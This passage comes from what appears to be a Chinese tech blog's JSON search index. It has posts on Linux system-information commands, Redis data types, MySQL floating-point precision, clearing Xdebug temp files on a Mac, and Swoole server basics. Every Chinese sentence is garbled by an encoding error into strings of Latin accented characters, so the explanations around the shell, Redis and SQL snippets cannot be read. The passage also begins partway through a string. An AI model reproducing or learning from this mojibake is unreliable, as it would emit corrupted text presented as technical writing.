çš„ä¸œè¥¿çœŸçš„æ˜¯å¤ªå¤šäº†ï¼ŒçœŸçš„æ˜¯å­¦çš„è¶Šå¤šï¼Œæ‰å‘ç°è‡ªå·±æ‡‚çš„çœŸçš„å¥½å°‘ã€‚ æœ€åæƒ³è¯´çš„æ˜¯ï¼Œå¸Œæœ›è‡ªå·±èƒ½ä¿æŒä½è¿™ä»½åˆå¿ƒï¼Œç»§ç»­åŠ æ²¹ã€‚","categories":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"Linux æŸ¥çœ‹ç³»ç»Ÿã€ç¡¬ä»¶ä¿¡æ¯","slug":"linux-view-system-and-hardware-information","date":"2020-11-09T14:33:03.000Z","updated":"2020-11-09T14:36:19.179Z","comments":true,"path":"linux-view-system-and-hardware-information/","link":"","permalink":"https://www.0x2beace.com/linux-view-system-and-hardware-information/","excerpt":"ä»¥ä¸‹å‘½ä»¤éƒ½æ˜¯åŸºäºUbuntuã€‚","text":"ä»¥ä¸‹å‘½ä»¤éƒ½æ˜¯åŸºäºUbuntuã€‚ ç³»ç»Ÿç›¸å…³æŸ¥çœ‹å†…æ ¸/æ“ä½œç³»ç»Ÿ/CPUä¿¡æ¯1$ uname -a æŸ¥çœ‹æ“ä½œç³»ç»Ÿç‰ˆæœ¬1$ head -n 1 &#x2F;etc&#x2F;issue æŸ¥çœ‹æœºå™¨å‹å·1$ dmidecode | grep &quot;Product Name&quot; æŸ¥çœ‹ä¸»æœºå1$ hostname åˆ—å‡ºæ‰€æœ‰PCIè®¾å¤‡1$ lspci -tv åˆ—å‡ºæ‰€æœ‰USBè®¾å¤‡1$ lsusb -tv åˆ—å‡ºåŠ è½½çš„å†…æ ¸æ¨¡å—1$ lsmod æŸ¥çœ‹ç¯å¢ƒå˜é‡1$ env èµ„æºæŸ¥çœ‹å†…å­˜ä½¿ç”¨é‡å’Œäº¤æ¢åŒºä½¿ç”¨é‡1$ free -m æŸ¥çœ‹å„åˆ†åŒºä½¿ç”¨æƒ…å†µ1$ df -h æŸ¥çœ‹æ€»å†…å­˜é‡1$ grep MemTotal &#x2F;proc&#x2F;meminfo æŸ¥çœ‹ç©ºé—²å†…å­˜é‡1$ grep MemFree &#x2F;proc&#x2F;meminfo æŸ¥çœ‹ç³»ç»Ÿè¿è¡Œæ—¶é—´ã€ç”¨æˆ·æ•°ã€è´Ÿè½½1$ uptime æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½1$ cat &#x2F;proc&#x2F;loadavg CPUæŸ¥çœ‹CPU ç»Ÿè®¡ä¿¡æ¯1$ lscpu æŸ¥çœ‹å•ä¸ªCPU ä¿¡æ¯1cat &#x2F;proc&#x2F;cpuinfo ç£ç›˜å’Œåˆ†åŒºæŸ¥çœ‹ç£ç›˜ç©ºé—´ä¿¡æ¯1$ df -h æŸ¥çœ‹æŒ‚æ¥çš„åˆ†åŒºçŠ¶æ€1mount | column -t æŸ¥çœ‹æ‰€æœ‰åˆ†åŒº1$ fdisk -l æŸ¥çœ‹æ‰€æœ‰äº¤æ¢åˆ†åŒº1$ swapon -s ç½‘ç»œæŸ¥çœ‹æ‰€æœ‰ç½‘ç»œæ¥å£çš„å±æ€§1$ ifconfig æŸ¥çœ‹é˜²ç«å¢™è®¾ç½®1$ iptables -L æŸ¥çœ‹è·¯ç”±è¡¨1$ route -n æŸ¥çœ‹æ‰€æœ‰ç›‘å¬ç«¯å£1$ netstat -lntp æŸ¥çœ‹æ‰€æœ‰å·²ç»å»ºç«‹çš„è¿æ¥1$ netstat -antp æŸ¥çœ‹ç½‘ç»œç»Ÿè®¡ä¿¡æ¯1$ netstat -s è¿›ç¨‹æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹1$ ps -ef å®æ—¶æ˜¾ç¤ºè¿›ç¨‹çŠ¶æ€1$ top ç”¨æˆ·æŸ¥çœ‹æ´»åŠ¨ç”¨æˆ·1$ w æŸ¥çœ‹æŒ‡å®šç”¨æˆ·ä¿¡æ¯1$ id &lt;ç”¨æˆ·å&gt; æŸ¥çœ‹ç”¨æˆ·ç™»å½•æ—¥å¿—1$ last æŸ¥çœ‹ç³»ç»Ÿæ‰€æœ‰ç”¨æˆ·1$ cut -d: -f1 &#x2F;etc&#x2F;passwd æŸ¥çœ‹ç³»ç»Ÿæ‰€æœ‰ç»„1$ cut -d: -f1 &#x2F;etc&#x2F;group æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡1$ crontab -l æœåŠ¡åˆ—å‡ºæ‰€æœ‰ç³»ç»ŸæœåŠ¡1$ chkconfig --list åˆ—å‡ºæ‰€æœ‰å¯åŠ¨çš„ç³»ç»ŸæœåŠ¡1$ chkconfig --list | grep on å‚è€ƒé“¾æ¥ Linux æŸ¥çœ‹CPUä¿¡æ¯ï¼Œæœºå™¨å‹å·ï¼Œå†…å­˜ç­‰ä¿¡æ¯","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Redis å¸¸ç”¨æ•°æ®ç±»å‹æ•´ç†","slug":"redis-common-data-types-sorting","date":"2020-11-07T14:43:21.000Z","updated":"2020-11-07T14:46:04.965Z","comments":true,"path":"redis-common-data-types-sorting/","link":"","permalink":"https://www.0x2beace.com/redis-common-data-types-sorting/","excerpt":"Redis çš„äº”ç§æ•°æ®ç±»å‹åˆ†åˆ«æ˜¯ï¼šå­—ç¬¦ä¸²ã€å“ˆå¸Œã€åˆ—è¡¨ã€é›†åˆã€æ— åºé›†åˆã€‚","text":"Redis çš„äº”ç§æ•°æ®ç±»å‹åˆ†åˆ«æ˜¯ï¼šå­—ç¬¦ä¸²ã€å“ˆå¸Œã€åˆ—è¡¨ã€é›†åˆã€æ— åºé›†åˆã€‚ Redis çš„äº”ç§æ•°æ®ç±»å‹stringå­—ç¬¦ä¸²æ˜¯Redis çš„äº”ç§æ•°æ®ç±»å‹ä¸­ï¼Œæœ€å¸¸è§æœ€å¥½ç†è§£çš„ã€‚ å®ƒçš„æ•°æ®ç»“æ„æœ€ç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„é”®å€¼å¯¹ï¼Œä¸€ä¸ªkey å¯¹åº”ä¸€ä¸ªvalueï¼š key æ˜¯string çš„é”®ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æ˜¯æ•°å­—ã€‚value æ˜¯string key æ‰€å¯¹åº”çš„å€¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æ˜¯æ•°å­—ã€‚ åº”ç”¨åœºæ™¯ incrï¼šè®¡æ•° set + getï¼šå°†å¯¹è±¡/Json åºåˆ—åŒ–ä¹‹åå­˜å‚¨ä½œä¸ºCache hashå“ˆå¸Œçš„æ•°æ®ç»“æ„å¾ˆåƒä¸€ä¸ªè¿·ä½ çš„å…³ç³»æ•°æ®åº“ã€‚ åº”ç”¨åœºæ™¯ hset + hgetï¼šCache liståˆ—è¡¨çš„ç‰¹ç‚¹æ˜¯ï¼š æœ‰åº å…è®¸é‡å¤ åº”ç”¨åœºæ™¯ lpush + lpopï¼šStack lpush + rpopï¼šQueue lpush + ltrimï¼šCapped Collection lpush + brpopï¼šMessage Queue seté›†åˆç‰¹ç‚¹ï¼š æ— åº ä¸å…è®¸é‡å¤ åº”ç”¨åœºæ™¯ saddï¼šTagging spop/srandmemberï¼šRandom item add + sinterï¼šSocial Graph sorted set åº”ç”¨åœºæ™¯ zscoreï¼štimeStampã€saleCountã€followCount é€šç”¨å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰keyï¼š 1keys * æŸ¥çœ‹åŠ è½½é…ç½®æ–‡ä»¶ï¼š 1config get * å½“å‰æ•°æ®åº“çš„ key çš„æ•°é‡ï¼š 1dbsize åˆ¤æ–­key æ˜¯å¦å­˜åœ¨ï¼š 1exists key åˆ é™¤keyï¼š 1del key æŸ¥çœ‹key çš„ç±»å‹ï¼š 1type key æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µï¼š 1info memory","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Mysql å¦‚ä½•é€‰æ‹© Floatã€Doubleã€Decimal","slug":"how-does-mysql-choose-float-double-decimal","date":"2020-11-06T14:25:45.000Z","updated":"2020-12-01T14:22:22.489Z","comments":true,"path":"how-does-mysql-choose-float-double-decimal/","link":"","permalink":"https://www.0x2beace.com/how-does-mysql-choose-float-double-decimal/","excerpt":"æˆ‘ä»¬çŸ¥é“åœ¨Mysql ä¸­å­˜å‚¨å°æ•°æœ‰ä¸‰ç§æ•°æ®ç±»å‹å¯åšé€‰æ‹©ï¼Œç©¶ç«Ÿè¯¥é€‰æ‹©å“ªä¸€ç§æ•°æ®æ ¼å¼ï¼Œå…¶å®å¹¶æ²¡æœ‰ç»Ÿä¸€çš„ç­”æ¡ˆï¼Œå¾—æ ¹æ®å®é™…åœºæ™¯å»åˆ†æï¼Œå“ªä¸€ç§æ›´åˆé€‚ã€‚","text":"æˆ‘ä»¬çŸ¥é“åœ¨Mysql ä¸­å­˜å‚¨å°æ•°æœ‰ä¸‰ç§æ•°æ®ç±»å‹å¯åšé€‰æ‹©ï¼Œç©¶ç«Ÿè¯¥é€‰æ‹©å“ªä¸€ç§æ•°æ®æ ¼å¼ï¼Œå…¶å®å¹¶æ²¡æœ‰ç»Ÿä¸€çš„ç­”æ¡ˆï¼Œå¾—æ ¹æ®å®é™…åœºæ™¯å»åˆ†æï¼Œå“ªä¸€ç§æ›´åˆé€‚ã€‚ åœºæ™¯é‡ç°å…ˆæ¥çœ‹è¿™æ ·ä¸€ä¸ªä¾‹å­ï¼Œå‡è®¾ç›®å‰æœ‰ä¸€å¼ è¡¨ç”¨æ¥å­˜å‚¨ç”¨æˆ·çš„ç§¯åˆ† 123CREATE TABLE &#96;table1&#96; ( &#96;integral&#96; float(10,2) DEFAULT NULL) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; ç„¶åå‘è¿™å¼ è¡¨ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼š 12345678910mysql&gt; INSERT INTO &#96;table1&#96; (&#96;integral&#96;) VALUES (131072.32);Query OK, 1 row affected (0.00 sec)mysql&gt; SELECT * FROM &#96;table1&#96;;+-----------+| integral |+-----------+| 131072.31 |+-----------+1 row in set (0.00 sec) é€šè¿‡æŸ¥è¯¢æ•°æ®è¡¨å¯ä»¥çœ‹åˆ°è¯¥æ¡è®°å½•å¹¶ä¸æ˜¯131072.32 è€Œæ˜¯131072.31ï¼Œä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿè¿™ä¸ªé—®é¢˜é—´æ¥æš´éœ²å‡ºäº†å…¶ä»–ä»€ä¹ˆé—®é¢˜ï¼Ÿ ä¸¢å¤±æ•°æ®æ˜¯å¦æ˜¯æ­£å¸¸ç°è±¡ï¼Ÿ ä¸ºä»€ä¹ˆä¼šå°‘0.01ï¼Œæœ‰æ²¡æœ‰å¯èƒ½å°‘0.02ï¼Œæˆ–è€…å°‘1ï¼Œå°‘10ç”šè‡³å°‘100ï¼Ÿ æ€ä¹ˆæ ·æ‰èƒ½è®©æˆ‘ä»¬çš„æ•°æ®å°½é‡å‡†ç¡®ï¼Ÿ ç²¾åº¦æ˜¯å¦‚ä½•ä¸¢å¤±çš„æ•°å€¼ç±»å‹å­˜å‚¨éœ€æ±‚|åˆ—ç±»å‹|å­˜å‚¨éœ€æ±‚|åˆ†é…å†…å­˜ç©ºé—´||-|-|-||FLOAT(p)|å¦‚æœ0 &lt;= p &lt;= 24ä¸º4ä¸ªå­—èŠ‚, å¦‚æœ25 &lt;= p &lt;= 53ä¸º8ä¸ªå­—èŠ‚|32,64||FLOAT|4ä¸ªå­—èŠ‚|32||DOUBLE [PRECISION], item REAL|8ä¸ªå­—èŠ‚|64||DECIMAL(M,D), NUMERIC(M,D)|å˜é•¿|| é€šè¿‡æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ï¼Œå¯ä»¥çœ‹åˆ°åœ¨è®¡ç®—æœºçš„ä¸–ç•Œä¸­ï¼Œæµ®ç‚¹æ•°è¿›è¡Œå­˜å‚¨æ—¶ï¼Œå¿…é¡»è¦å…ˆè½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œé€šä¿—ä¸€ç‚¹è®²ä¹Ÿå°±æ˜¯æµ®ç‚¹æ•°çš„ç²¾åº¦å®é™…ä¸Šæ˜¯ç”±äºŒè¿›åˆ¶çš„ç²¾åº¦æ¥å†³å®šçš„ã€‚ æˆ‘ä»¬çŸ¥é“å¯¹äºfloatç±»å‹çš„æ•°æ®ï¼Œåªåˆ†é…äº†32ä½çš„å­˜å‚¨ç©ºé—´ï¼Œå¯¹äºdoubleç±»å‹å€¼åˆ†é…äº†64ä½ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰çš„å®æ•°éƒ½èƒ½è½¬æˆ32ä½æˆ–è€…64ä½çš„äºŒè¿›åˆ¶å½¢å¼ï¼Œå¦‚æœè¶…è¿‡äº†ï¼Œå°±ä¼šå‡ºç°æˆªæ–­ï¼Œè¿™å°±æ˜¯è¯¯å·®çš„æ¥æºã€‚ æ¯”å¦‚å°†ä¸Šé¢ä¾‹å­ä¸­çš„ 131072.32 è½¬æˆäºŒè¿›åˆ¶åçš„æ•°æ®ä¸ºï¼š 1100000000000000000.0101000111101011100001010001111010111000010100011111â€¦ è¿™æ˜¯ä¸€ä¸ªæ— ç©·æ•°ï¼Œå¯¹äºfloat ç±»å‹ï¼Œåªèƒ½æˆªå–å‰32ä½è¿›è¡Œå­˜å‚¨ï¼Œå¯¹äºdoubleåªèƒ½æˆªå–å‰64ä½è¿›è¡Œå­˜å‚¨ã€‚ å¯¹äº float è€Œè¨€ï¼Œæœ€ç»ˆå­˜å‚¨çš„å€¼æ˜¯ï¼š01001000000000000000000000010100 å¯¹äº double è€Œè¨€ï¼Œæœ€ç»ˆå­˜å‚¨çš„å€¼æ˜¯ï¼š0100000100000000000000000000001010001111010111000010100011110101 æ‰€ä»¥æˆ‘ä»¬æš‚æ—¶å¯ä»¥å¾—å‡ºä¸€ä¸ªç»“è®ºï¼š è®¤è¯†Floatã€DecimalFloat å’Œ Decimal è¿™ç±»æ•°æ®ç±»å‹éƒ½å¯ä»¥é€šè¿‡ä¸¤ä½å‚æ•°æ¥æ§åˆ¶å…¶ç²¾åº¦ã€‚ å…¶å­˜å‚¨æ ¼å¼æ˜¯ï¼š 1FLOAT&#x2F;DECIMAIL [(M,D)] [UNSIGNED] [ZEROFILL] å¸¸è§è¯¯åŒº ç²¾åº¦æ€»èƒ½ç²¾ç¡®åˆ°D ä½ã€‚ å­˜å‚¨ç©ºé—´å¤§å°å†³å®šå­˜å‚¨ç²¾åº¦ï¼Œå’ŒDå€¼æ— å…³ï¼ŒFloat çš„å­˜å‚¨ç©ºé—´åªæœ‰32 ä½ï¼Œå½“éœ€è¦å­˜å‚¨çš„äºŒè¿›åˆ¶å¤§äº32 ä½æ—¶ï¼Œå°±ä¼šæˆªæ–­ï¼ˆå››èˆäº”å…¥ï¼‰ã€‚ 12345678910111213mysql&gt; create table table2 (integral float(15,2));Query OK, 0 rows affected (0.02 sec)mysql&gt; insert into table2 values (123456789.39);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from table2;+--------------+| integral |+--------------+| 123456792.00 |+--------------+1 row in set (0.00 sec) æ•°æ®å­˜å‚¨åªèƒ½å­˜å‚¨åˆ°D ä½ æµ®ç‚¹å‹æ•°æ®æœ€ç»ˆéƒ½è¦è¢«è½¬æˆäºŒè¿›åˆ¶è¿›è¡Œå­˜å‚¨ã€‚å¹¶ä¸”å¯¹äºfloat è€Œè¨€ï¼Œå­˜å‚¨ç±»å‹åªèƒ½æ˜¯32ä½0å’Œ1çš„ç»„åˆã€‚ 12345678910111213141516171819mysql&gt; select * from table1;+-----------+| integral |+-----------+| 131072.31 |+-----------+1 row in set (0.00 sec)mysql&gt; alter table table1 modify integral float(10,4);Query OK, 0 rows affected (0.00 sec)Records: 0 Duplicates: 0 Warnings: 0mysql&gt; select * from table1;+-------------+| integral |+-------------+| 131072.3125 |+-------------+1 row in set (0.00 sec) DECIMAL(M,D)ä¸­ï¼ŒD å€¼çš„æ˜¯å°æ•°éƒ¨åˆ†çš„ä½æ•°ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå½“ä¿®æ”¹äº†D çš„å€¼ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹åˆ°MySQL çœŸæ­£å­˜å‚¨çš„æ•°å€¼ä¹Ÿå‘ç”Ÿäº†å˜åŒ–ã€‚ int(3)/int(5) åŒºåˆ« æ­£å¸¸æ˜¾ç¤ºæ²¡æœ‰åŒºåˆ«ã€‚ 3 å’Œ 5 ä»…æ˜¯æœ€å°æ˜¾ç¤ºå®½åº¦è€Œå·²ï¼Œå¹¶ä¸ä»£è¡¨æœ€å¤šå­˜å‚¨å®½åº¦ã€‚ æœ‰ zerofill ç­‰æ‰©å±•å±æ€§æ—¶åˆ™æ˜¾ç¤ºæœ‰åŒºåˆ«ã€‚ æ€»ç»“ï¼š è‹¥æ’å…¥çš„å€¼æœªæŒ‡å®šå°æ•°éƒ¨åˆ†æˆ–è€…å°æ•°éƒ¨åˆ†ä¸è¶³D ä½åˆ™ä¼šè‡ªåŠ¨è¡¥åˆ°D ä½å°æ•°ã€‚ è‹¥æ’å…¥çš„å€¼å°æ•°éƒ¨åˆ†è¶…è¿‡äº†D ä¸ºåˆ™ä¼šå‘ç”Ÿæˆªæ–­ï¼Œæˆªå–å‰D ä½å°æ•°(å››èˆäº”å…¥æˆªå–)ã€‚ M å€¼æŒ‡æ˜¯æ•´æ•°éƒ¨åˆ†åŠ å°æ•°éƒ¨åˆ†çš„æ€»é•¿åº¦ï¼Œä¹Ÿå³æ’å…¥çš„æ•°å­—æ•´æ•°éƒ¨åˆ†ä¸èƒ½è¶…è¿‡M-D ä½ï¼Œå¦åˆ™ä¸èƒ½æˆåŠŸæ’å…¥ï¼Œä¼šæŠ¥è¶…å‡ºèŒƒå›´çš„é”™è¯¯ã€‚ å¦‚ä½•é€‰æ‹©Floatã€Doubleã€Decimalå‚è€ƒé“¾æ¥ MySQLå¦‚ä½•é€‰æ‹©float, double, decimal","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mac ä¸´æ—¶æ–‡ä»¶å ç”¨è¿‡å¤šç£ç›˜ç©ºé—´","slug":"mac-temporary-files-take-up-too-much-disk-space","date":"2020-11-05T12:09:58.000Z","updated":"2020-11-07T07:58:37.436Z","comments":true,"path":"mac-temporary-files-take-up-too-much-disk-space/","link":"","permalink":"https://www.0x2beace.com/mac-temporary-files-take-up-too-much-disk-space/","excerpt":"æœ€è¿‘ä½¿ç”¨Mac æ—¶ï¼Œè¢«å‘ŠçŸ¥ç£ç›˜ç©ºé—´ä¸¥é‡ä¸è¶³äº†ï¼Œæˆ‘å¿ƒæƒ³æœ€è¿‘åˆæ²¡æœ‰ä¸‹è½½ä»€ä¹ˆå¤§æ–‡ä»¶ï¼Œæ€ä¹ˆä¼šçªç„¶æ»¡ç›˜äº†ã€‚","text":"æœ€è¿‘ä½¿ç”¨Mac æ—¶ï¼Œè¢«å‘ŠçŸ¥ç£ç›˜ç©ºé—´ä¸¥é‡ä¸è¶³äº†ï¼Œæˆ‘å¿ƒæƒ³æœ€è¿‘åˆæ²¡æœ‰ä¸‹è½½ä»€ä¹ˆå¤§æ–‡ä»¶ï¼Œæ€ä¹ˆä¼šçªç„¶æ»¡ç›˜äº†ã€‚ äºæ˜¯ä½¿ç”¨DaisyDisk æ‰«æäº†ä¸€ä¸‹ç£ç›˜ç©ºé—´ï¼Œå‘ç°å…¶ä¸­å¤šè¾¾ 186 G å…¨æ˜¯ä¸´æ—¶æ–‡ä»¶ã€‚ èµ·åˆä»¥ä¸ºæ˜¯ç³»ç»Ÿäº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ã€‚å› ä¸ºå¹¶ä¸çŸ¥é“è¿™äº›æ–‡ä»¶æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œæ‰€ä»¥ä¹Ÿä¸å¤ªæ•¢ç›´æ¥åˆ é™¤ï¼Œåªå°è¯•è¿‡é‡å¯ç”µè„‘ä½†å¹¶æ²¡æœ‰ç”¨ã€‚ åæ¥é€šè¿‡Apple ç¤¾åŒºæé—®æ‰äº†è§£åˆ°ï¼ŒåŸæ¥cachegrind.out è¿™ç±»æ–‡ä»¶å…¨æ˜¯ Xdebug çš„è¾“å‡ºæ–‡ä»¶ï¼æ‰€ä»¥æ˜¯å¯ä»¥ç›´æ¥åˆ é™¤æ‰çš„ï½ æ­¤å‰ä»æœªæ¸…ç†è¿‡è¿™ç±»æ–‡ä»¶ï¼Œæ‰€ä»¥æ‰ä¼šå¯¼è‡´ä¸´æ—¶æ–‡ä»¶å¦‚æ­¤ä¹‹å¤§â€¦ å¯ä»¥æ‰“å¼€ç»ˆç«¯ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ¸…ç†ï¼š 1234sudo rm -rf &#x2F;private&#x2F;var&#x2F;tmp&#x2F;cachegrind.out.*# æˆ–è€…sudo find &#x2F;private&#x2F;var&#x2F;tmp -name &quot;cachegrind*&quot; -exec rm -rf &#123;&#125; \\; å› ä¸ºæœ¬åœ°åº”ç”¨çš„Xdebug ä¸€ç›´éƒ½æ˜¯å¼€å¯ç€çš„ï¼Œæ‰€ä»¥è¯·æ±‚è¯¥åº”ç”¨æ—¶ï¼ŒXdebug å°±ä¼šå°†è°ƒè¯•ä¿¡æ¯è¾“å‡ºè‡³ä¸´æ—¶æ–‡ä»¶äº†ï¼Œå¦‚å›¾ï¼š","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Swoole åŸºç¡€çŸ¥è¯†å­¦ä¹ ","slug":"swoole-basic-knowledge-learning","date":"2020-11-03T14:33:46.000Z","updated":"2020-11-03T14:35:50.059Z","comments":true,"path":"swoole-basic-knowledge-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-basic-knowledge-learning/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•Swoole åŸºç¡€çŸ¥è¯†çš„å­¦ä¹ ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•Swoole åŸºç¡€çŸ¥è¯†çš„å­¦ä¹ ã€‚ Masterã€Managerã€Workerã€ReactorMasterMaster è¿›ç¨‹æ˜¯ä¸€ä¸ªå¤šçº¿ç¨‹è¿›ç¨‹ã€‚ Manager è¿›ç¨‹è´Ÿè´£åˆ›å»º / å›æ”¶ worker/task è¿›ç¨‹ Worker è¿›ç¨‹ æ¥å—ç”± Reactor çº¿ç¨‹æŠ•é€’çš„è¯·æ±‚æ•°æ®åŒ…ï¼Œå¹¶æ‰§è¡Œ PHP å›è°ƒå‡½æ•°å¤„ç†æ•°æ® ç”Ÿæˆå“åº”æ•°æ®å¹¶å‘ç»™ Reactor çº¿ç¨‹ï¼Œç”± Reactor çº¿ç¨‹å‘é€ç»™ TCP å®¢æˆ·ç«¯ å¯ä»¥æ˜¯å¼‚æ­¥éé˜»å¡æ¨¡å¼ï¼Œä¹Ÿå¯ä»¥æ˜¯åŒæ­¥é˜»å¡æ¨¡å¼ Worker ä»¥å¤šè¿›ç¨‹çš„æ–¹å¼è¿è¡Œ Reactor çº¿ç¨‹ Reactor çº¿ç¨‹æ˜¯åœ¨ Master è¿›ç¨‹ä¸­åˆ›å»ºçš„çº¿ç¨‹ è´Ÿè´£ç»´æŠ¤å®¢æˆ·ç«¯ TCP è¿æ¥ã€å¤„ç†ç½‘ç»œ IOã€å¤„ç†åè®®ã€æ”¶å‘æ•°æ® ä¸æ‰§è¡Œä»»ä½• PHP ä»£ç  å°† TCP å®¢æˆ·ç«¯å‘æ¥çš„æ•°æ®ç¼“å†²ã€æ‹¼æ¥ã€æ‹†åˆ†æˆå®Œæ•´çš„ä¸€ä¸ªè¯·æ±‚æ•°æ®åŒ… æœ‰ä¸€ä¸ªæ›´åŠ é€šä¿—çš„æ¯”å–»æ¥æè¿°è¿™ä¸‰è€…çš„å…³ç³»ï¼šå‡è®¾ Server å°±æ˜¯ä¸€ä¸ªå·¥å‚ï¼Œé‚£ Reactor å°±æ˜¯é”€å”®ï¼Œæ¥å—å®¢æˆ·è®¢å•ã€‚è€Œ Workerå°±æ˜¯å·¥äººï¼Œå½“é”€å”®æ¥åˆ°è®¢å•åï¼ŒWorkerå»å·¥ä½œç”Ÿäº§å‡ºå®¢æˆ·è¦çš„ä¸œè¥¿ï¼Œè€Œ TaskWorker å¯ä»¥ç†è§£ä¸ºè¡Œæ”¿äººå‘˜ï¼Œå¯ä»¥å¸®åŠ© Worker å¹²äº›æ‚äº‹ï¼Œè®© Workerä¸“å¿ƒå·¥ä½œã€‚ å…¶ä»–IPv4 ä½¿ç”¨ 127.0.0.1 è¡¨ç¤ºç›‘å¬æœ¬æœºï¼Œ0.0.0.0 è¡¨ç¤ºç›‘å¬æ‰€æœ‰åœ°å€IPv6 ä½¿ç”¨::1 è¡¨ç¤ºç›‘å¬æœ¬æœºï¼Œ:: (ç›¸å½“äº 0:0:0:0) è¡¨ç¤ºç›‘å¬æ‰€æœ‰åœ°å€ TCP åè®®TCP (Transmission Control Protocol ä¼ è¾“æ§åˆ¶åè®®ï¼‰åè®®æ˜¯ä¸€ç§é¢å‘è¿æ¥çš„ï¼Œå¯é çš„ï¼ŒåŸºäºå­—èŠ‚æµçš„ä¼ è¾“é€šä¿¡åè®®ã€‚ UDP åè®®UDP (User Datagram Protocol ç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰æ˜¯ä¸€ç§æ— è¿æ¥çš„ä¼ è¾“å±‚åè®®ï¼Œæä¾›é¢å‘äº‹åŠ¡çš„ç®€å•ä¸å¯é ä¿¡æ¯ä¼ é€æœåŠ¡ã€‚ UDP æœåŠ¡å™¨ä¸ TCP æœåŠ¡å™¨ä¸åŒï¼ŒUDP æ²¡æœ‰è¿æ¥çš„æ¦‚å¿µã€‚å¯åŠ¨ Server åï¼Œå®¢æˆ·ç«¯æ— éœ€ Connectï¼Œç›´æ¥å¯ä»¥å‘ Server ç›‘å¬çš„ 9502 ç«¯å£å‘é€æ•°æ®åŒ…ã€‚ å¸¸è§é—®é¢˜TCP â€œç²˜åŒ…â€é—®é¢˜é¦–å…ˆæ¥è§£é‡Šä»¥ä¸‹æ‰€è°“çš„â€œç²˜åŒ…â€é—®é¢˜å…¶æœ¬è´¨æ˜¯ä»€ä¹ˆã€‚ æœåŠ¡ç«¯å»ºç«‹æœåŠ¡ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·è¿æ¥ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯çš„æ¯æ¬¡ sendï¼Œå®¢æˆ·ç«¯éƒ½èƒ½æ­£å¸¸ recvã€‚ä½†åœ¨å¹¶å‘çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯çš„ä¸¤æ¬¡send æˆ–è€…æ›´å¤šæ¬¡ snedï¼Œå®¢æˆ·ç«¯å¯èƒ½ä¸€æ¬¡å°± recväº†ã€‚ æ‰€ä»¥è¿™å°±å¯¼è‡´â€œç²˜åŒ…â€é—®é¢˜çš„äº§ç”Ÿã€‚ TCP åè®®çš„æœ¬è´¨æ˜¯æµåè®®ï¼Œå®ƒåªä¼šä¿è¯ä¿è¯å‘é€æ–¹ä»¥ä»€ä¹ˆé¡ºåºå‘é€å­—èŠ‚ï¼Œæ¥æ”¶æ–¹å°±ä¸€å®šèƒ½æŒ‰è¿™ä¸ªé¡ºåºæ¥æ”¶åˆ°ã€‚æ‰€ä»¥æ‰€è°“çš„â€œç²˜åŒ…â€é—®é¢˜ä¸åº”è¯¥æ˜¯ä¼ è¾“å±‚çš„é—®é¢˜ï¼Œè€Œæ˜¯åº”ç”¨å±‚çš„é—®é¢˜ã€‚ æ— æ³•è¿æ¥åˆ°æœåŠ¡å™¨çš„ç®€å•æ£€æµ‹æ‰‹æ®µ åœ¨ Linux ä¸‹ï¼Œä½¿ç”¨ netstat -an | grep ç«¯å£ï¼ŒæŸ¥çœ‹ç«¯å£æ˜¯å¦å·²ç»è¢«æ‰“å¼€å¤„äº Listening çŠ¶æ€ 